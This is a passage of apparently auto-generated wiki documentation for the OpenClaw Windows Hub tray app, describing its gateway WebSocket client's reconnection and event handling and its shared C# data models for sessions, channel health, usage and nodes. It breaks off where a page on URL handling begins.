| `_usageStatus` | `GatewayUsageStatusInfo?` | `usage.status` responses | `UsageStatusUpdated` event |
| `_usageCost` | `GatewayCostUsageInfo?` | `usage.cost` responses | `UsageCostUpdated` event |

### Session Tracking

Sessions are updated in two ways:

1. **Bulk Update**: Response to `sessions.list` request
2. **Incremental Update**: Individual tool/job events update last activity text

```
UpdateTrackedSession(sessionKey, isMain, activityText)
{
    if (_sessions.TryGetValue(sessionKey, out var session))
    {
        session.LastActivity = activityText;
        // No event fired - reduces noise
    }
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:25-36,861,919,956-970]()

---

## Reconnection Strategy

### Exponential Backoff

The client uses an exponential backoff strategy for reconnection attempts:

| Attempt | Delay |
|---------|-------|
| 1 | 1 second |
| 2 | 2 seconds |
| 3 | 4 seconds |
| 4 | 8 seconds |
| 5 | 15 seconds |
| 6 | 30 seconds |
| 7+ | 60 seconds |

```mermaid
sequenceDiagram
    participant Listen as "ListenForMessagesAsync"
    participant Client as "OpenClawGatewayClient"
    participant Gateway as "Gateway Server"
    
    Note over Listen: "Connection lost"
    Listen->>Client: "ReconnectWithBackoffAsync()"
    Note over Client: "Attempt 1<br/>Wait 1 second"
    Client->>Gateway: "ConnectAsync()"
    Gateway-->>Client: "Connection failed"
    
    Client->>Client: "ReconnectWithBackoffAsync()"
    Note over Client: "Attempt 2<br/>Wait 2 seconds"
    Client->>Gateway: "ConnectAsync()"
    Gateway-->>Client: "Connection failed"
    
    Client->>Client: "ReconnectWithBackoffAsync()"
    Note over Client: "Attempt 3<br/>Wait 4 seconds"
    Client->>Gateway: "ConnectAsync()"
    Gateway-->>Client: "Connected"
    
    Note over Client: "Reset attempts to 0"
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:22-23,97,316-339,518-522]()

### Reconnection Triggers

Reconnection is triggered by:

1. **Connection close** (from server)
2. **WebSocket errors** (premature close)
3. **Send failures** (in `CheckHealthAsync()`)
4. **Automatic**: If not disposed and not cancelled

The listen loop automatically triggers reconnection unless `_disposed` is true or the cancellation token is cancelled.

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:494-522]()

---

## Integration with Tray Application

### Initialization

The tray application creates the gateway client during startup:

```csharp
// App.xaml.cs initialization
_settings = new SettingsManager();
if (_settings?.EnableNodeMode != true)
{
    InitializeGatewayClient();
}

void InitializeGatewayClient()
{
    _gatewayClient = new OpenClawGatewayClient(
        _settings.GatewayUrl,
        _settings.Token,
        logger: Logger.Instance);
    
    // Subscribe to events
    _gatewayClient.StatusChanged += OnGatewayStatusChanged;
    _gatewayClient.ActivityChanged += OnGatewayActivityChanged;
    _gatewayClient.NotificationReceived += OnGatewayNotificationReceived;
    _gatewayClient.SessionsUpdated += OnGatewaySessionsUpdated;
    _gatewayClient.UsageUpdated += OnGatewayUsageUpdated;
    _gatewayClient.ChannelHealthUpdated += OnGatewayChannelHealthUpdated;
    
    _ = _gatewayClient.ConnectAsync();
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:263-274,1435-1481]()

### Event Handlers

Event handlers marshal updates to the UI thread and update application state:

```csharp
private void OnGatewayStatusChanged(object? sender, ConnectionStatus status)
{
    _dispatcherQueue?.TryEnqueue(() =>
    {
        _currentStatus = status;
        UpdateTrayIcon();
    });
}

private void OnGatewayActivityChanged(object? sender, AgentActivity activity)
{
    _dispatcherQueue?.TryEnqueue(() =>
    {
        _currentActivity = activity;
        UpdateTrayIcon();
        UpdateTrayBadge();
    });
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:1483-1539]()

### Polling for Updates

In addition to push events, the app polls for state updates:

```csharp
// Health check timer (every 30 seconds)
private void StartHealthCheckTimer()
{
    _healthCheckTimer = new System.Timers.Timer(30000);
    _healthCheckTimer.Elapsed += async (s, e) =>
    {
        if (_gatewayClient != null)
        {
            await _gatewayClient.CheckHealthAsync();
        }
    };
    _healthCheckTimer.Start();
}
```

**Sources:** [src/OpenClaw.Tray.WinUI/App.xaml.cs:277,1796-1810]()

---

## Thread Safety

The client is designed to be used from a single thread but fires events that may need marshaling:

### Event Marshaling

All gateway events are fired on the WebSocket receive thread. The tray application uses `DispatcherQueue.TryEnqueue()` to marshal them to the UI thread:

```csharp
_gatewayClient.ActivityChanged += (s, activity) =>
{
    _dispatcherQueue?.TryEnqueue(() =>
    {
        // UI updates here
        UpdateTrayIcon();
    });
};
```

### Concurrent Request Tracking

The `_pendingRequestMethods` dictionary is protected by `_pendingRequestLock`:

```csharp
lock (_pendingRequestLock)
{
    _pendingRequestMethods[requestId] = method;
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:32,436-469](), [src/OpenClaw.Tray.WinUI/App.xaml.cs:1483-1487]()

---

## Disposal

```csharp
public void Dispose()
{
    if (_disposed) return;
    _disposed = true;
    
    _cts.Cancel();
    _webSocket?.Dispose();
    _cts.Dispose();
}
```

Disposal:
1. Cancels the listen loop
2. Disposes the WebSocket
3. Disposes the CancellationTokenSource
4. Does NOT send a close frame (canceled immediately)

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:1087-1096]()

---

## Error Handling

### Connection Errors

Connection failures trigger:
1. `StatusChanged(ConnectionStatus.Error)` event
2. Automatic reconnection with backoff
3. Logging via `_logger.Error()`

### Request Errors

Request failures (response with `ok: false`) trigger:
- Logging via `_logger.Warn()`
- Special handling for unsupported methods (fallback or disable)
- `SessionCommandCompleted` event with error details (for UI feedback)

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:104-108,149-153,659-704]()

### Message Processing Errors

JSON parse errors and message processing errors are caught and logged but don't terminate the connection:

```csharp
catch (JsonException ex)
{
    _logger.Warn($"JSON parse error: {ex.Message}");
}
catch (Exception ex)
{
    _logger.Error("Message processing error", ex);
}
```

**Sources:** [src/OpenClaw.Shared/OpenClawGatewayClient.cs:547-554]()

---

# Page: Data Models

# Data Models

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/Models.cs](src/OpenClaw.Shared/Models.cs)
- [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs](src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs)
- [src/OpenClaw.Tray/TrayApplication.cs](src/OpenClaw.Tray/TrayApplication.cs)
- [tests/OpenClaw.Shared.Tests/ModelsTests.cs](tests/OpenClaw.Shared.Tests/ModelsTests.cs)

</details>



This page documents the shared data models defined in `OpenClaw.Shared` that represent gateway state, events, and information exchanged between the Windows Hub applications and the OpenClaw Gateway. These models are used throughout the codebase for displaying gateway status, sessions, notifications, and usage information in the UI.

For information about how these models are transmitted over WebSocket, see [Gateway Client](#3.1). For information about node-specific models used in Node Mode, see [Node Client & Pairing](#4.1).

## Overview

All data models are defined in [src/OpenClaw.Shared/Models.cs:1-457]() and are plain C# classes with properties and computed display helpers. The models fall into several categories:

| Category | Purpose | Key Models |
|----------|---------|------------|
| Connection State | Track WebSocket connection and pairing status | `ConnectionStatus`, `PairingStatus`, `PairingStatusEventArgs` |
| Activity Tracking | Real-time agent activity from gateway events | `ActivityKind`, `AgentActivity` |
| Notifications | Chat and system notifications | `OpenClawNotification`, `UserNotificationRule` |
| Channel Health | Communication channel status | `ChannelHealth` |
| Sessions | Active agent sessions and their state | `SessionInfo`, `SessionPreviewInfo`, `SessionCommandResult` |
| Usage & Cost | Token usage and cost tracking | `GatewayUsageInfo`, `GatewayCostUsageInfo` |
| Nodes | Connected node information | `GatewayNodeInfo` |

**Sources:** [src/OpenClaw.Shared/Models.cs:1-457]()

## Model Relationships and Data Flow

```mermaid
graph TB
    subgraph "Gateway Events (WebSocket)"
        WSStatus["WebSocket Status Changes"]
        WSActivity["event: agent (activity)"]
        WSNotif["event: chat (notification)"]
        WSHealth["health.status response"]
        WSSessions["sessions.list response"]
        WSUsage["usage response"]
    end
    
    subgraph "Connection Models"
        ConnectionStatus["ConnectionStatus enum<br/>Disconnected/Connecting/Connected/Error"]
        PairingStatus["PairingStatus enum<br/>Unknown/Pending/Paired/Rejected"]
        PairingStatusEventArgs["PairingStatusEventArgs<br/>Status, DeviceId, Message"]
    end
    
    subgraph "Activity Models"
        ActivityKind["ActivityKind enum<br/>Idle/Job/Exec/Read/Write/Edit/Search/Browser/Message/Tool"]
        AgentActivity["AgentActivity<br/>SessionKey, IsMain, Kind, State, ToolName, Label<br/>+ Glyph, DisplayText"]
    end
    
    subgraph "Notification Models"
        OpenClawNotification["OpenClawNotification<br/>Title, Message, Type, IsChat<br/>Channel, Agent, Intent, Tags"]
        UserNotificationRule["UserNotificationRule<br/>Pattern, IsRegex, Category, Enabled"]
    end
    
    subgraph "Health Models"
        ChannelHealth["ChannelHealth<br/>Name, Status, IsLinked, Error, AuthAge, Type<br/>+ DisplayText, IsHealthyStatus(), IsIntermediateStatus()"]
    end
    
    subgraph "Session Models"
        SessionInfo["SessionInfo<br/>Key, IsMain, Status, Model, Channel, DisplayName<br/>InputTokens, OutputTokens, TotalTokens, ContextTokens<br/>ThinkingLevel, VerboseLevel, CurrentActivity<br/>+ DisplayText, RichDisplayText, AgeText, ShortKey"]
        SessionPreviewInfo["SessionPreviewInfo<br/>Key, Status, Items[]"]
        SessionCommandResult["SessionCommandResult<br/>Method, Ok, Key, Deleted, Compacted, Kept, Error"]
    end
    
    subgraph "Usage Models"
        GatewayUsageInfo["GatewayUsageInfo<br/>InputTokens, OutputTokens, TotalTokens<br/>CostUsd, RequestCount, Model, ProviderSummary<br/>+ DisplayText"]
        GatewayCostUsageInfo["GatewayCostUsageInfo<br/>UpdatedAt, Days, Totals, Daily[]"]
        GatewayUsageStatusInfo["GatewayUsageStatusInfo<br/>UpdatedAt, Providers[]"]
    end
    
    subgraph "Node Models"
        GatewayNodeInfo["GatewayNodeInfo<br/>NodeId, DisplayName, Mode, Status, Platform<br/>LastSeen, IsOnline, CapabilityCount, CommandCount<br/>+ ShortId, DisplayText, DetailText"]
    end
    
    WSStatus --> ConnectionStatus
    WSStatus --> PairingStatus
    WSActivity --> ActivityKind
    WSActivity --> AgentActivity
    WSNotif --> OpenClawNotification
    WSHealth --> ChannelHealth
    WSSessions --> SessionInfo
    WSSessions --> SessionPreviewInfo
    WSUsage --> GatewayUsageInfo
    WSUsage --> GatewayCostUsageInfo
    WSUsage --> GatewayUsageStatusInfo
    
    OpenClawNotification -.->|"filtered by"| UserNotificationRule
```

**Sources:** [src/OpenClaw.Shared/Models.cs:1-457](), [src/OpenClaw.Tray/TrayApplication.cs:26-50]()

## Connection and Pairing Models

### ConnectionStatus Enumeration

The `ConnectionStatus` enum represents the current WebSocket connection state:

```mermaid
stateDiagram-v2
    [*] --> Disconnected
    Disconnected --> Connecting: ConnectAsync()
    Connecting --> Connected: WebSocket open
    Connecting --> Error: Connection failed
    Connected --> Disconnected: DisconnectAsync()
    Connected --> Error: WebSocket error
    Error --> Connecting: Retry
    Error --> Disconnected: Give up
```

| Value | Description |
|-------|-------------|
| `Disconnected` | No active connection |
| `Connecting` | Connection attempt in progress |
| `Connected` | Active WebSocket connection |
| `Error` | Connection failed or encountered error |

**Sources:** [src/OpenClaw.Shared/Models.cs:3-9]()

### PairingStatus Enumeration

The `PairingStatus` enum tracks the Node Mode device pairing state:

| Value | Description |
|-------|-------------|
| `Unknown` | Pairing state not yet determined |
| `Pending` | Connected but awaiting gateway approval |
| `Paired` | Approved with device token |
| `Rejected` | Pairing request was rejected |

**Sources:** [src/OpenClaw.Shared/Models.cs:11-17]()

### PairingStatusEventArgs

Event arguments for pairing status changes, containing the status, device ID, and optional message:

**Properties:**
- `Status` (`PairingStatus`) - Current pairing state
- `DeviceId` (`string`) - Unique device identifier
- `Message` (`string?`) - Optional status message

**Sources:** [src/OpenClaw.Shared/Models.cs:19-31]()

## Activity Models

### ActivityKind Enumeration

Defines the types of activities an agent can perform:

| Value | Glyph | Description |
|-------|-------|-------------|
| `Idle` | (empty) | No active work |
| `Job` | ⚡ | Job execution |
| `Exec` | 💻 | Command execution |
| `Read` | 📄 | File reading |
| `Write` | ✍️ | File writing |
| `Edit` | 📝 | File editing |
| `Search` | 🔍 | Search operation |
| `Browser` | 🌐 | Browser interaction |
| `Message` | 💬 | Messaging |
| `Tool` | 🛠️ | Tool usage |

**Sources:** [src/OpenClaw.Shared/Models.cs:33-45]()

### AgentActivity Class

Represents real-time agent activity, received via `event: agent` WebSocket messages.

**Properties:**
- `SessionKey` (`string`) - Session identifier
- `IsMain` (`bool`) - Whether this is the main session
- `Kind` (`ActivityKind`) - Type of activity
- `State` (`string`) - Current state description
- `ToolName` (`string`) - Name of tool being used
- `Label` (`string`) - Display label for the activity

**Computed Properties:**

```mermaid
graph LR
    Kind["Kind<br/>(ActivityKind)"]
    IsMain["IsMain<br/>(bool)"]
    Label["Label<br/>(string)"]
    
    Kind --> Glyph["Glyph<br/>(string)<br/>Emoji based on Kind"]
    Kind --> DisplayText
    IsMain --> DisplayText["DisplayText<br/>(string)<br/>'Main/Sub · Glyph Label'"]
    Label --> DisplayText
    Glyph --> DisplayText
```

The `Glyph` property maps each `ActivityKind` to an emoji icon [src/OpenClaw.Shared/Models.cs:56-68]().

The `DisplayText` property combines the session type (Main/Sub), glyph, and label, or returns empty string if `Idle` [src/OpenClaw.Shared/Models.cs:70-72]().

**Sources:** [src/OpenClaw.Shared/Models.cs:47-73](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:6-124]()

## Notification Models

### OpenClawNotification Class

Represents notifications received from the gateway via `event: chat` messages.

**Properties:**
- `Title` (`string`) - Notification title
- `Message` (`string`) - Notification body
- `Type` (`string`) - Notification type for filtering (e.g., "urgent", "health", "email")
- `IsChat` (`bool`) - Whether from chat response

**Structured Metadata:**
- `Channel` (`string?`) - Source channel (telegram, email, chat)
- `Agent` (`string?`) - Agent name/identifier
- `Intent` (`string?`) - Normalized intent (reminder, build, alert)
- `Tags` (`string[]?`) - Free-form routing tags

These properties enable granular notification filtering in the UI.

**Sources:** [src/OpenClaw.Shared/Models.cs:75-87]()

### UserNotificationRule Class

User-defined rules for categorizing notifications.

**Properties:**
- `Pattern` (`string`) - Text pattern to match
- `IsRegex` (`bool`) - Whether pattern is regex
- `Category` (`string`) - Category to assign (default: "info")
- `Enabled` (`bool`) - Whether rule is active (default: true)

**Sources:** [src/OpenClaw.Shared/Models.cs:92-98]()

## Channel Health Models

### ChannelHealth Class

Represents the health status of a communication channel (telegram, slack, email, etc.).

**Properties:**
- `Name` (`string`) - Channel name
- `Status` (`string`) - Status string from gateway
- `IsLinked` (`bool`) - Whether channel is linked
- `Error` (`string?`) - Error message if any
- `AuthAge` (`string?`) - Authentication age description
- `Type` (`string?`) - Channel type

**Status Classification Methods:**

```mermaid
graph TB
    Status["Status string"]
    
    Status --> IsHealthyStatus["IsHealthyStatus()<br/>static helper"]
    Status --> IsIntermediateStatus["IsIntermediateStatus()<br/>static helper"]
    
    IsHealthyStatus --> Healthy["Healthy:<br/>ok, connected, running,<br/>active, ready"]
    IsIntermediateStatus --> Intermediate["Intermediate:<br/>stopped, idle, paused,<br/>configured, pending,<br/>connecting, reconnecting"]
    
    Status --> Other["Other:<br/>error, disconnected,<br/>not configured, etc."]
```

- `IsHealthyStatus(status)` - Returns `true` for "ok", "connected", "running", "active", "ready" [src/OpenClaw.Shared/Models.cs:113-114]()
- `IsIntermediateStatus(status)` - Returns `true` for "stopped", "idle", "paused", "configured", "pending", "connecting", "reconnecting" [src/OpenClaw.Shared/Models.cs:119-121]()

**Display Text Generation:**

The `DisplayText` property generates a formatted status string:

```
[LABEL] ChannelName: status detail
```

Where `LABEL` is determined by status:

| Status Pattern | Label | Example |
|---------------|-------|---------|
| ok, connected, running | `[ON]` | `[ON] Telegram: ok` |
| linked | `[LINKED]` | `[LINKED] Slack: linked · 2d ago` |
| ready | `[READY]` | `[READY] Email: ready` |
| connecting, reconnecting | `[...]` | `[...] Telegram: connecting` |
| error, disconnected | `[ERR]` | `[ERR] Slack: error (timeout)` |
| stale | `[STALE]` | `[STALE] Email: stale` |
| configured, stopped | `[OFF]` | `[OFF] Telegram: stopped` |
| not configured | `[N/A]` | `[N/A] Email: not configured` |
| (default) | `[OFF]` | `[OFF] Unknown: weird` |

**Sources:** [src/OpenClaw.Shared/Models.cs:100-147](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:126-303]()

## Session Models

### SessionInfo Class

Represents an active agent session with comprehensive state information.

**Core Properties:**
- `Key` (`string`) - Session key (e.g., "agent:main:subagent:uuid")
- `IsMain` (`bool`) - Whether this is the main session
- `Status` (`string`) - Session status
- `Model` (`string?`) - AI model being used
- `Channel` (`string?`) - Communication channel
- `DisplayName` (`string?`) - User-friendly name
- `Provider` (`string?`) - AI provider
- `Subject` (`string?`), `Room` (`string?`), `Space` (`string?`), `SessionId` (`string?`) - Additional context

**Configuration Properties:**
- `ThinkingLevel` (`string?`) - Thinking verbosity level
- `VerboseLevel` (`string?`) - Output verbosity level
- `SystemSent` (`bool`) - Whether system message was sent
- `AbortedLastRun` (`bool`) - Whether last run was aborted

**Token Tracking:**
- `InputTokens` (`long`) - Input tokens used
- `OutputTokens` (`long`) - Output tokens generated
- `TotalTokens` (`long`) - Total tokens in current run
- `ContextTokens` (`long`) - Context window size

**Timestamps:**
- `UpdatedAt` (`DateTime?`) - Last update time
- `StartedAt` (`DateTime?`) - Session start time
- `LastSeen` (`DateTime`) - Last seen timestamp (default: UtcNow)

**Current State:**
- `CurrentActivity` (`string?`) - Current activity description

**Computed Display Properties:**

```mermaid
graph TB
    subgraph "Input Properties"
        IsMain["IsMain"]
        Channel["Channel"]
        CurrentActivity["CurrentActivity"]
        Status["Status"]
        DisplayName["DisplayName"]
        Model["Model"]
        ThinkingLevel["ThinkingLevel"]
        VerboseLevel["VerboseLevel"]
        SystemSent["SystemSent"]
        AbortedLastRun["AbortedLastRun"]
        TotalTokens["TotalTokens"]
        ContextTokens["ContextTokens"]
        UpdatedAt["UpdatedAt"]
        LastSeen["LastSeen"]
        Key["Key"]
    end
    
    subgraph "Display Text Generation"
        IsMain --> DisplayText["DisplayText<br/>'Main/Sub · Channel · Activity/Status'"]
        Channel --> DisplayText
        CurrentActivity --> DisplayText
        Status --> DisplayText
        
        DisplayName --> RichDisplayText["RichDisplayText<br/>DisplayName/Session · Channel · Model<br/>· Context · Thinking · Verbose<br/>· system · aborted · Activity/Status"]
        Model --> RichDisplayText
        ThinkingLevel --> RichDisplayText
        VerboseLevel --> RichDisplayText
        SystemSent --> RichDisplayText
        AbortedLastRun --> RichDisplayText
        CurrentActivity --> RichDisplayText
        Status --> RichDisplayText
        TotalTokens --> ContextSummaryShort
        ContextTokens --> ContextSummaryShort["ContextSummaryShort<br/>'Total/Context' (K/M formatted)"]
        ContextSummaryShort --> RichDisplayText
        
        UpdatedAt --> AgeText["AgeText<br/>'just now' / 'Xm ago'<br/>/ 'Xh ago' / 'Xd ago'"]
        LastSeen --> AgeText
        
        Key --> ShortKey["ShortKey<br/>Extract meaningful part<br/>or truncate"]
    end
```

**Display Properties:**

1. **`DisplayText`** - Simple one-line summary:
   - Format: `"Main/Sub"` [ `· Channel` ] [ `· CurrentActivity` | `· Status` ]
   - Example: `"Main · slack · 💻 Running command"`
   - [src/OpenClaw.Shared/Models.cs:175-192]()

2. **`RichDisplayText`** - Comprehensive multi-part summary:
   - Uses `DisplayName` if set, otherwise "Main session" or "Session"
   - Includes: channel, model, context summary, thinking level, verbose level, system flag, aborted flag, activity/status
   - Example: `"telegram:alerts · claude-opus-4-6 · 12.0K/200.0K ctx · think high · running"`
   - [src/OpenClaw.Shared/Models.cs:194-224]()

3. **`AgeText`** - Human-readable time since last update:
   - "just now" (< 60s)
   - "Xm ago" (< 60min)
   - "Xh ago" (< 48h)
   - "Xd ago" (≥ 48h)
   - [src/OpenClaw.Shared/Models.cs:226-237]()

4. **`ContextSummaryShort`** - Token usage summary:
   - Format: `"Total/Context"` with K/M suffixes
   - Example: `"12.0K/200.0K"`
   - Empty if either token count is zero
   - [src/OpenClaw.Shared/Models.cs:239-246]()

5. **`ShortKey`** - Shortened session key:
   - For colon-separated keys: extracts second-to-last part (e.g., "agent:main:subagent:uuid" → "subagent")
   - For file paths: extracts filename
   - Otherwise: truncates to 17 chars + "..."
   - [src/OpenClaw.Shared/Models.cs:249-271]()

**Sources:** [src/OpenClaw.Shared/Models.cs:149-279](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:305-828]()

### Session Preview Models

Additional models for session preview data:

**`SessionPreviewItemInfo`** - Individual preview item:
- `Role` (`string`) - Message role
- `Text` (`string`) - Message text
- [src/OpenClaw.Shared/Models.cs:373-377]()

**`SessionPreviewInfo`** - Preview for a single session:
- `Key` (`string`) - Session key
- `Status` (`string`) - Session status
- `Items` (`List<SessionPreviewItemInfo>`) - Preview items
- [src/OpenClaw.Shared/Models.cs:379-384]()

**`SessionsPreviewPayloadInfo`** - Container for all previews:
- `UpdatedAt` (`DateTime`) - Update timestamp
- `Previews` (`List<SessionPreviewInfo>`) - List of session previews
- [src/OpenClaw.Shared/Models.cs:386-390]()

**Sources:** [src/OpenClaw.Shared/Models.cs:373-390]()

### SessionCommandResult

Result of session manipulation commands (delete, compact, etc.):

- `Method` (`string`) - Command method name
- `Ok` (`bool`) - Whether command succeeded
- `Key` (`string?`) - Session key
- `Deleted` (`bool?`) - Whether session was deleted
- `Compacted` (`bool?`) - Whether session was compacted
- `Kept` (`int?`) - Number of messages kept
- `Reason` (`string?`) - Reason for result
- `Error` (`string?`) - Error message if failed

**Sources:** [src/OpenClaw.Shared/Models.cs:392-402]()

## Usage and Cost Models

### GatewayUsageInfo Class

Summary usage information from the gateway.

**Properties:**
- `InputTokens` (`long`) - Input tokens consumed
- `OutputTokens` (`long`) - Output tokens generated
- `TotalTokens` (`long`) - Total tokens used
- `CostUsd` (`double`) - Cost in USD
- `RequestCount` (`int`) - Number of requests
- `Model` (`string?`) - Model name
- `ProviderSummary` (`string?`) - Provider summary text

**Display Text Generation:**

The `DisplayText` property formats usage as a compact string:
- Includes tokens (with K/M formatting) if > 0
- Includes cost if > 0
- Includes request count if > 0
- Includes model name if present
- Falls back to `ProviderSummary` if no other data
- Returns "No usage data" if empty

Examples:
- `"Tokens: 5.0K · $0.25 · 42 requests · claude-3-5-sonnet"`
- `"OpenAI: 72% left"` (legacy ProviderSummary)

**Token Formatting Helper:**

The private `FormatCount(long n)` method formats large numbers:
- ≥ 1,000,000: `"X.XM"`
- ≥ 1,000: `"X.XK"`
- Otherwise: as-is

**Sources:** [src/OpenClaw.Shared/Models.cs:281-318](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:450-535]()

### Detailed Usage Models

**`GatewayUsageWindowInfo`** - Usage window information:
- `Label` (`string`) - Window label
- `UsedPercent` (`double`) - Percentage used
- `ResetAt` (`DateTime?`) - Reset timestamp
- [src/OpenClaw.Shared/Models.cs:320-325]()

**`GatewayUsageProviderInfo`** - Provider-specific usage:
- `Provider` (`string`) - Provider identifier
- `DisplayName` (`string`) - Display name
- `Plan` (`string?`) - Plan name
- `Error` (`string?`) - Error message
- `Windows` (`List<GatewayUsageWindowInfo>`) - Usage windows
- [src/OpenClaw.Shared/Models.cs:327-334]()

**`GatewayUsageStatusInfo`** - Overall usage status:
- `UpdatedAt` (`DateTime`) - Update timestamp
- `Providers` (`List<GatewayUsageProviderInfo>`) - Provider data
- [src/OpenClaw.Shared/Models.cs:336-340]()

**Sources:** [src/OpenClaw.Shared/Models.cs:320-340]()

### Cost Tracking Models

**`GatewayCostUsageTotalsInfo`** - Total cost metrics:
- `Input` (`long`) - Input tokens
- `Output` (`long`) - Output tokens
- `CacheRead` (`long`) - Cache read tokens
- `CacheWrite` (`long`) - Cache write tokens
- `TotalTokens` (`long`) - Total tokens
- `TotalCost` (`double`) - Total cost
- `MissingCostEntries` (`int`) - Entries without cost data
- [src/OpenClaw.Shared/Models.cs:342-351]()

**`GatewayCostUsageDayInfo`** - Daily breakdown:
- `Date` (`string`) - Date string
- `Input`, `Output`, `CacheRead`, `CacheWrite`, `TotalTokens`, `TotalCost`, `MissingCostEntries` - Same as totals
- [src/OpenClaw.Shared/Models.cs:353-363]()

**`GatewayCostUsageInfo`** - Complete cost usage:
- `UpdatedAt` (`DateTime`) - Update timestamp
- `Days` (`int`) - Number of days covered
- `Totals` (`GatewayCostUsageTotalsInfo`) - Aggregate totals
- `Daily` (`List<GatewayCostUsageDayInfo>`) - Daily breakdown
- [src/OpenClaw.Shared/Models.cs:365-371]()

**Sources:** [src/OpenClaw.Shared/Models.cs:342-371]()

## Node Models

### GatewayNodeInfo Class

Represents information about a connected node (when viewing from gateway perspective).

**Properties:**
- `NodeId` (`string`) - Unique node identifier
- `DisplayName` (`string`) - User-friendly name
- `Mode` (`string`) - Operating mode
- `Status` (`string`) - Current status
- `Platform` (`string?`) - Platform identifier
- `LastSeen` (`DateTime?`) - Last seen timestamp
- `IsOnline` (`bool`) - Whether currently online
- `CapabilityCount` (`int`) - Number of capabilities
- `CommandCount` (`int`) - Number of commands

**Computed Properties:**

```mermaid
graph LR
    NodeId["NodeId"] --> ShortId["ShortId<br/>(first 12 chars + ellipsis)"]
    
    DisplayName["DisplayName"] --> DisplayText
    ShortId --> DisplayText["DisplayText<br/>'Name · status'"]
    IsOnline["IsOnline"] --> DisplayText
    Status["Status"] --> DisplayText
    
    Mode["Mode"] --> DetailText["DetailText<br/>'Mode · Platform · X cmd · Y cap<br/>· seen Z ago'"]
    Platform["Platform"] --> DetailText
    CommandCount["CommandCount"] --> DetailText
    CapabilityCount["CapabilityCount"] --> DetailText
    LastSeen["LastSeen"] --> DetailText
```

**`ShortId`** - Truncated node ID:
- If ≤ 12 chars: return as-is
- Otherwise: first 12 chars + "…"
- [src/OpenClaw.Shared/Models.cs:416]()

**`DisplayText`** - Node summary:
- Format: `"{DisplayName/ShortId} · {status}"`
- Status is "online" if `IsOnline`, otherwise uses `Status` or "offline"
- Example: `"My Windows PC · online"`
- [src/OpenClaw.Shared/Models.cs:418-426]()

**`DetailText`** - Detailed node information:
- Includes: mode, platform, command count, capability count, last seen
- Example: `"node · windows · 5 cmd · 2 cap · seen just now"`
- Uses same age formatting as `SessionInfo.AgeText`
- [src/OpenClaw.Shared/Models.cs:428-445]()

**Sources:** [src/OpenClaw.Shared/Models.cs:404-455](), [tests/OpenClaw.Shared.Tests/ModelsTests.cs:537-671]()

## Usage in UI Components

The data models are consumed throughout the UI to display gateway state:

```mermaid
graph TB
    subgraph "Data Models"
        ConnectionStatus["ConnectionStatus"]
        AgentActivity["AgentActivity"]
        ChannelHealth["ChannelHealth"]
        SessionInfo["SessionInfo"]
        GatewayUsageInfo["GatewayUsageInfo"]
        OpenClawNotification["OpenClawNotification"]
    end
    
    subgraph "WinForms Tray (OpenClaw.Tray)"
        TrayIcon["TrayApplication<br/>_notifyIcon"]
        TrayMenu["ContextMenuStrip<br/>_contextMenu"]
        ModernMenu["ModernTrayMenu"]
        StatusDetail["StatusDetailForm"]
    end
    
    subgraph "WinUI Tray (OpenClaw.Tray.WinUI)"
        TrayApp["App.xaml.cs<br/>TrayIcon"]
        StatusWindow["StatusDetailWindow"]
        MainWindow["MainWindow"]
    end
    
    ConnectionStatus -->|"UpdateStatus()"| TrayIcon
    AgentActivity -->|"UpdateActivity()"| TrayIcon
    ChannelHealth -->|"UpdateChannelHealth()"| TrayMenu
    SessionInfo -->|"UpdateSessions()"| TrayMenu
    GatewayUsageInfo -->|"UpdateUsage()"| TrayMenu
    
    ConnectionStatus --> ModernMenu
    ChannelHealth --> ModernMenu
    SessionInfo --> ModernMenu
    GatewayUsageInfo --> ModernMenu
    
    OpenClawNotification -->|"ShowNotificationToast()"| TrayIcon
    
    ConnectionStatus --> StatusWindow
    ChannelHealth --> StatusWindow
    SessionInfo --> StatusWindow
    GatewayUsageInfo --> StatusWindow
```

**Key UI Integration Points:**

1. **Tray Icon Updates** - `ConnectionStatus` and `AgentActivity` drive icon appearance and tooltip [src/OpenClaw.Tray/TrayApplication.cs:501-533]()

2. **Context Menu** - Channel and session lists are dynamically built from `ChannelHealth[]` and `SessionInfo[]` [src/OpenClaw.Tray/TrayApplication.cs:614-692]()

3. **Modern Menu** - Uses display properties to build Windows 11-style menu [src/OpenClaw.Tray/TrayApplication.cs:191-301]()

4. **Status Detail Window** - Displays comprehensive view using all models [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs:39-111]()

5. **Notifications** - `OpenClawNotification` filtered and displayed as toasts [src/OpenClaw.Tray/TrayApplication.cs:838-857]()

**Sources:** [src/OpenClaw.Tray/TrayApplication.cs:191-704](), [src/OpenClaw.Tray.WinUI/Windows/StatusDetailWindow.xaml.cs:20-111]()

---

# Page: URL Handling & Validation

# URL Handling & Validation

<details>
<summary>Relevant source files</summary>

The following files were used as context for generating this wiki page:

- [src/OpenClaw.Shared/GatewayUrlHelper.cs](src/OpenClaw.Shared/GatewayUrlHelper.cs)
- [tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs](tests/OpenClaw.Shared.Tests/GatewayUrlHelperTests.cs)
- [tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs](tests/OpenClaw.Shared.Tests/WindowsNodeClientTests.cs)

</details>



This page documents the URL handling and validation system used throughout the OpenClaw Windows Hub for processing gateway connection URLs. The system handles WebSocket URL normalization, embedded credential extraction, and URL sanitization for safe display.

For information about the actual gateway client that uses these URLs, see [Gateway Client](#3.1). For configuration where users enter gateway URLs, see [Settings Window](#5.1).

## Overview

The gateway URL handling system solves several requirements:

